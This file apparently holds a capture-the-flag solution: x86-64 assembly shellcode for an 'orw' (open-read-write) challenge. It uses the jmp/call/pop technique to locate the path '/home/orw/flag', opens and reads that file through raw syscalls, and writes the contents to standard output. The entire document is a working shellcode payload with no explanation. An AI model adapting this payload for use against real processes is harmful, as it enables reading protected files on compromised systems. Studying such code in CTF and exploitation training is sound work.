BITS 64

jmp one

two:
	pop rdi
	xor rax, rax
	add rax, 2
	xor rsi, rsi
	syscall

	mov rsi, rdi
	mov rdi, rax
	xor rax, rax
	xor rdx, rdx
	add rdx, 64
	syscall

	mov rdx, rax
	xor rdi, rdi
	add rdi, 1
	xor rax, rax
	add rax, 1
	syscall

	xor rax, rax
	add rax, 60
	xor rdi, rdi
	syscall

one:
	call two
	db "/home/orw/flag"
